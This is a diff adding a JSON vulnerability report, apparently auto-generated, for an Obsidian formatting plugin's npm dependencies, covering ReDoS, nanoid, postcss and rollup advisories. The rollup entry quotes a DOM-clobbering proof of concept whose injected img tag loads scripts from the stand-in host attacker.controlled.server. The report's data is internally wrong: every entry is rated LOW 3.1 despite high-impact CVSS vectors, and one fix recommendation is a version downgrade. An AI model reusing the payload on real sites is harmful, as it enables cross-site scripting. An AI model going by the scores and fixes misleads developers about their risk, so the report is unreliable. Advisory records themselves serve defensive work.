@@ -1,0 +1,1068 @@
+{
+  "analyzedAt": "2025-12-17T20:07:21.704Z",
+  "source": "Reocin__obsidian-markdown-formatting-assistant-plugin.osv.json",
+  "summary": {
+    "totalVulnerabilities": 10,
+    "uniqueVulnerabilities": 9,
+    "affectedPackages": 9,
+    "stalePackages": 10,
+    "stalePackagesOldFix": 7,
+    "severityBreakdown": {
+      "CRITICAL": 0,
+      "HIGH": 0,
+      "MEDIUM": 0,
+      "LOW": 10
+    },
+    "recentVulnerabilities": 0,
+    "hasFixAvailable": 10
+  },
+  "vulnerabilities": [
+    {
+      "id": "GHSA-v6h2-p8h4-qcjw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-5889"
+      ],
+      "summary": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "details": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "cwes": [
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-06-09T21:30:51Z",
+        "modifiedDate": "2025-06-11T20:54:10Z",
+        "daysSincePublished": 190
+      },
+      "affected": {
+        "package": "brace-expansion",
+        "version": "1.1.11",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.1.11",
+        "fixedIn": "2.0.2",
+        "recommendation": "Upgrade to 2.0.2 or later",
+        "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+        "daysSinceFix": 188,
+        "monthsSinceFix": 6,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-5889"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/juliangruber/brace-expansion"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?ctiid.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?id.311660"
+        },
+        {
+          "type": "WEB",
+          "url": "https://vuldb.com/?submit.585717"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-grv7-fg5c-xmjg",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-4068"
+      ],
+      "summary": "Uncontrolled resource consumption in braces",
+      "details": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
+      "cwes": [
+        {
+          "id": "CWE-1050",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-05-14T18:30:54Z",
+        "modifiedDate": "2024-07-15T22:12:28.795792Z",
+        "daysSincePublished": 582
+      },
+      "affected": {
+        "package": "braces",
+        "version": "3.0.2",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.0.2",
+        "fixedIn": "3.0.3",
+        "recommendation": "Upgrade to 3.0.3 or later",
+        "fixAvailableSince": "2024-07-15T22:12:28.795Z",
+        "daysSinceFix": 519,
+        "monthsSinceFix": 17,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/issues/35"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/pull/37"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/pull/40"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff"
+        },
+        {
+          "type": "WEB",
+          "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4068"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/micromatch/braces"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-3rfm-jhwj-7488",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-37603"
+      ],
+      "summary": "loader-utils is vulnerable to Regular Expression Denial of Service (ReDoS) via url variable",
+      "details": "A Regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils 2.0.0 via the url variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-10-14T19:00:38Z",
+        "modifiedDate": "2023-11-08T04:10:09.241945Z",
+        "daysSincePublished": 1160
+      },
+      "affected": {
+        "package": "loader-utils",
+        "version": "3.2.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.2.0",
+        "fixedIn": "1.4.2",
+        "recommendation": "Upgrade to 1.4.2 or later",
+        "fixAvailableSince": "2023-11-08T04:10:09.241Z",
+        "daysSinceFix": 770,
+        "monthsSinceFix": 25,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-37603"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/issues/213"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/issues/216"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/webpack/loader-utils"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L107"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ERN6YE3DS7NBW7UH44SCJBMNC2NWQ7SM"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KAC5KQ2SEWAMQ6UZAUBZ5KXKEOESH375"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VNV2GNZXOTEDAJRFH3ZYWRUBGIVL7BSU"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-hhq3-ff78-jv3g",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-37599"
+      ],
+      "summary": "loader-utils is vulnerable to Regular Expression Denial of Service (ReDoS)",
+      "details": "A regular expression denial of service (ReDoS) flaw was found in Function interpolateName in interpolateName.js in webpack loader-utils via the resourcePath variable in interpolateName.js. A badly or maliciously formed string could be used to send crafted requests that cause a system to crash or take a disproportional amount of time to process. This issue has been patched in versions 1.4.2, 2.0.4 and 3.2.1.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        },
+        {
+          "id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption (DoS)"
+        }
+      ],
+      "age": {
+        "age": "3 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2022-10-12T12:00:27Z",
+        "modifiedDate": "2025-11-04T22:07:19Z",
+        "daysSincePublished": 1162
+      },
+      "affected": {
+        "package": "loader-utils",
+        "version": "3.2.0",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.2.0",
+        "fixedIn": "1.4.2",
+        "recommendation": "Upgrade to 1.4.2 or later",
+        "fixAvailableSince": "2025-11-04T22:07:19.000Z",
+        "daysSinceFix": 42,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-37599"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/issues/211"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/issues/216"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/commit/17cbf8fa8989c1cb45bdd2997aa524729475f1fa"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/commit/ac09944dfacd7c4497ef692894b09e63e09a5eeb"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/commit/d2d752d59629daee38f34b24307221349c490eb1"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/webpack/loader-utils"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L38"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/interpolateName.js#L83"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/3HUE6ZR5SL73KHL7XUPAOEL6SB7HUDT2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PVVPNSAGSDS63HQ74PJ7MZ3MU5IYNVZ"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PVVPNSAGSDS63HQ74PJ7MZ3MU5IYNVZ"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-952p-6rrq-rcjv",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-4067"
+      ],
+      "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
+      "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-05-14T18:30:54Z",
+        "modifiedDate": "2024-08-28T13:12:26Z",
+        "daysSincePublished": 582
+      },
+      "affected": {
+        "package": "micromatch",
+        "version": "4.0.2",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.0.2",
+        "fixedIn": "4.0.8",
+        "recommendation": "Upgrade to 4.0.8 or later",
+        "fixAvailableSince": "2024-08-28T13:12:26.000Z",
+        "daysSinceFix": 476,
+        "monthsSinceFix": 15,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/issues/243"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/pull/247"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/pull/266"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://advisory.checkmarx.net/advisory/CVE-2024-4067"
+        },
+        {
+          "type": "WEB",
+          "url": "https://devhub.checkmarx.com/cve-details/CVE-2024-4067"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/micromatch/micromatch"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/micromatch/micromatch/releases/tag/4.0.8"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-mwcw-c2x4-8c55",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-55565"
+      ],
+      "summary": "Predictable results in nanoid generation when given non-integer values",
+      "details": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+      "cwes": [
+        {
+          "id": "CWE-835",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-12-09T03:30:59Z",
+        "modifiedDate": "2025-11-04T16:54:54Z",
+        "daysSincePublished": 373
+      },
+      "affected": {
+        "package": "nanoid",
+        "version": "3.3.4",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "3.3.4",
+        "fixedIn": "5.0.9",
+        "recommendation": "Upgrade to 5.0.9 or later",
+        "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55565"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/pull/510"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/ai/nanoid"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/compare/3.3.7...3.3.8"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ai/nanoid/releases/tag/5.0.9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2025/01/msg00006.html"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-7fh5-64p2-3v2j",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-44270"
+      ],
+      "summary": "PostCSS line return parsing error",
+      "details": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+      "cwes": [
+        {
+          "id": "CWE-144",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-74",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-09-30T00:31:10Z",
+        "modifiedDate": "2025-11-04T16:45:01Z",
+        "daysSincePublished": 809
+      },
+      "affected": {
+        "package": "postcss",
+        "version": "8.4.16",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "8.4.16",
+        "fixedIn": "8.4.31",
+        "recommendation": "Upgrade to 8.4.31 or later",
+        "fixAvailableSince": "2025-11-04T16:45:01.000Z",
+        "daysSinceFix": 43,
+        "monthsSinceFix": 1,
+        "isOldFix": false
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44270"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/github/advisory-database/issues/2820"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/postcss/postcss"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/postcss/postcss/releases/tag/8.4.31"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-gcx4-mw62-g8wm",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "aliases": [
+        "CVE-2024-47068"
+      ],
+      "summary": "DOM Clobbering Gadget found in rollup bundled scripts that leads to XSS",
+      "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162\n\nhttps://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",
+      "cwes": [
+        {
+          "id": "CWE-79",
+          "name": "Cross-Site Scripting (XSS)"
+        }
+      ],
+      "age": {
+        "age": "1 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2024-09-23T22:11:02Z",
+        "modifiedDate": "2024-09-26T21:11:53Z",
+        "daysSincePublished": 449
+      },
+      "affected": {
+        "package": "rollup",
+        "version": "2.77.2",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "2.77.2",
+        "fixedIn": "3.29.5",
+        "recommendation": "Upgrade to 3.29.5 or later",
+        "fixAvailableSince": "2024-09-26T21:11:53.000Z",
+        "daysSinceFix": 446,
+        "monthsSinceFix": 14,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47068"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/rollup/rollup"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-c2qf-rxjj-qqgw",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2022-25883"
+      ],
+      "summary": "semver vulnerable to Regular Expression Denial of Service",
+      "details": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-06-21T06:30:28Z",
+        "modifiedDate": "2024-12-06T20:34:31Z",
+        "daysSincePublished": 910
+      },
+      "affected": {
+        "package": "semver",
+        "version": "5.7.1",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "5.7.1",
+        "fixedIn": "7.5.2",
+        "recommendation": "Upgrade to 7.5.2 or later",
+        "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+        "daysSinceFix": 375,
+        "monthsSinceFix": 12,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25883"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/564"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/585"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/pull/593"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/2f8fd41487acf380194579ecb6f8b1bbfe116be0"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/717534ee353682f3bcf33e60a8af4292626d4441"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/commit/928e56d21150da0413a3333a3148b20e741a920c"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/npm/node-semver"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104"
+        },
+        {
+          "type": "WEB",
